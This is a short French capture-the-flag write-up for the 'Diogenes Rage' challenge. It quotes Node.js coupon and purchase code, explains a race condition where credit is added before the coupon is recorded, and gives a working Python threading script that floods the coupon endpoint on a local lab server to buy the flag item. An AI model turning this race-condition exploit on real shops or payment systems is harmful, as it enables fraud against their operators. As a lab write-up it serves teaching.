\section{Diogenes Rage}

keywords: race condition

on a donc du \verb+JWT+

\subsection{/api/purchase}

en post on lui donne un \verb+username+ et il le créé


\begin{verbatim}
if (product.price <= user.balance) {
	newBalance = parseFloat(user.balance - product.price).toFixed(2);
	return db.setBalance(req.data.username, newBalance)
		.then(() => {
			if (product.item_name == 'C8') return res.json({
				flag: fs.readFileSync('/app/flag').toString(),
				message: `Thank you for your order! $${newBalance} coupon credits left!`
			})
			res.send(response(`Thank you for your order! $${newBalance} coupon credits left!`))
		});
}
\end{verbatim}

donc on obtient le flag si l'on arrive a acheter le produit C8.

Il faut ajouter du credit par ajout d'un coupon mais je ne vois pas de faille
SQL.
\begin{verbatim}
return db.addBalance(user.username, coupon.value)
	.then(() => {
		db.setCoupon(user.username, coupon_code)
			.then(() => res.send(response(`$${coupon.value} coupon redeemed successfully! Please select an item for order.`)))
	})
	.catch(() => res.send(response("Failed to redeem the coupon!")));
\end{verbatim}
en fait l'erreur vient du fait que le credit est ajouté avant d'ajouter le
coupon et qu'il ne reecrit pas la balance qu'il a lu. 

Donc si on appel plein de fois en parallele il est possible que l'on puisse
ajouter plein de fois le montant du coupon.


\begin{verbatim}
import requests
import threading
import subprocess

url = "http://localhost:1337" 
apply_api = url + "/api/coupons/apply"
purchase_api = url +"/api/purchase"
p_1 = {"item": "A1"}
p_2 = {"item": "C8"}
coupon = {"coupon_code": "HTB_100"}

def requestCoupon(cookie):
  for i in range(5):
    res = requests.post(url=apply_api, data=coupon, cookies=cookie)

def get_cookie():
    res = requests.post(url=purchase_api, data=p_1)
    cookie = {
      "session" : res.cookies["session"]
    }
    return cookie

if __name__ == '__main__':
  while True:
    cookie = get_cookie()

    threads = []
    for i in range(20):
      thread = threading.Thread(target=requestCoupon, args=(cookie, ))
      threads.append(thread)

    for thread in threads: 
      thread.start()
    
    for thread in threads: 
      thread.join()
    r = requests.post(url=purchase_api, data=p_2, cookies=cookie)
    if(r.status_code == 200):
        print(f'result {r.text}')
        break
\end{verbatim}
